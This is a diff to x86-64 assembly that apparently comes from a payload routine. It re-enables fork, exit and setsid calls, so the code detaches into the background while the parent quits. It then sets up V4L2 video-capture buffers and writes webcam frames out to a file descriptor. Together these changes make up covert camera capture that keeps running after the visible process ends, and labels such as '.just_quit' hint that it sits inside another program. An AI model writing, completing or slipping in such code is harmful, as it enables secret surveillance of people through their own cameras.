@@ -852,23 +852,23 @@ end_:
 	.just_quit:
 		POP_ALL
 
-		;mov		rax, SYS_fork
-		;syscall
+		mov		rax, SYS_fork
+		syscall
 
 		cmp		eax, 0
 		jng		.continue_fork
 
-		;mov		rax, SYS_exit
-		;xor		rdi, rdi
+		mov		rax, SYS_exit
+		xor		rdi, rdi
 		NOP
 		NOP
 		NOP
 		NOP
-		;syscall
+		syscall
 
 	.continue_fork:
-		;mov		rax, SYS_setsid
-		;syscall
+		mov		rax, SYS_setsid
+		syscall
 
 		mov		rax, SYS_open
 		lea		rdi, [rel pathv]
@@ -912,10 +912,10 @@ end_:
 		;	__u32 memory;         // le type de memoire
 		;	__u32 reserved[2];    //
 		;};
-
-		mov		dword [reqb    ], NBUF
-		mov		dword [reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
-		mov		dword [reqb + 8], V4L2_MEMORY_MMAP
+		; struct v4l2_buffer
+		mov		dword [rel reqb], NBUF
+		mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP
 		xor		eax, eax
 		mov		[reqb + 12], eax  ; reserved = 0
 		mov		rax, SYS_ioctl
@@ -926,9 +926,9 @@ end_:
 
 %assign i 0
 %rep NBUF
-		mov		dword [v4buf], i
-		mov		dword [v4buf + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
-		mov		dword [v4buf + 60], V4L2_MEMORY_MMAP
+		mov		dword [rel v4buf], i
+		mov		dword [rel v4buf + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		mov		dword [rel v4buf + 60], V4L2_MEMORY_MMAP
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_QUERYBUF
@@ -937,16 +937,16 @@ end_:
 
 		mov		rax, SYS_mmap
 		xor		rdi, rdi                          ; addr = NULL
-		mov		edx, [v4buf + 72]                 ; length (dword) → edx
+		mov		edx, [rel v4buf + 72]                 ; length (dword) → edx
 		mov		esi, edx                          ; rsi = length
 		mov		edx, PROT_READ | PROT_WRITE       ; rdx
 		mov		r10, MAP_SHARED
 		mov		r8,  r12                          ; fd
-		mov		r9,  [v4buf + 64]                 ; offset (qword)
+		mov		r9,  [rel v4buf + 64]                 ; offset (qword)
 		syscall
-		mov		[buf_addrs + i*8], rax            ; save address
-		mov		eax, [v4buf + 72]
-		mov		[buf_sizes + i*8], rax            ; save size (dword → qword)
+		mov		[rel buf_addrs + i*8], rax            ; save address
+		mov		eax, [rel v4buf + 72]
+		mov		[rel buf_sizes + i*8], rax            ; save size (dword → qword)
 
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
@@ -963,32 +963,28 @@ end_:
 
 		mov		rcx, FRAMES
 		.loop_frames:
-		push rcx
-		; DQBUF ---------------------------------------------------------
+		push	rcx
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_DQBUF
 		lea		rdx, [rel v4buf]
 		syscall
 
-		; sortir la frame sur stdout
-		mov		ebx, [v4buf]                      ; index (dword)
-		mov		edx, [v4buf + 8]                  ; bytesused
-		mov		rsi, [buf_addrs + rbx*8]          ; addr
+		mov		ebx, [rel v4buf]                      ; index (dword)
+		mov		edx, [rel v4buf + 8]                  ; bytesused
+		lea		rcx, [rel buf_addrs]
+		mov		rsi, [rcx + rbx*8]          ; addr
 		mov		rdi, r13                          ; stdout
 		mov		rax, SYS_write
 		syscall
 
-		; remettre le tampon dans la file (QBUF) ------------------------
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
 		mov		rsi, VIDIOC_QBUF
 		lea		rdx, [rel v4buf]
 		syscall
-		pop rcx
-
+		pop		rcx
 		loop	.loop_frames
-
 
 		mov		rax, SYS_ioctl
 		mov		rdi, r12
@@ -999,8 +995,8 @@ end_:
 %assign i 0
 %rep NBUF
 		mov		rax, SYS_munmap
-		mov		rdi, [buf_addrs + i*8]
-		mov		rsi, [buf_sizes + i*8]
+		mov		rdi, [rel buf_addrs + i*8]
+		mov		rsi, [rel buf_sizes + i*8]
 		syscall
 %assign i i+1
 %endrep
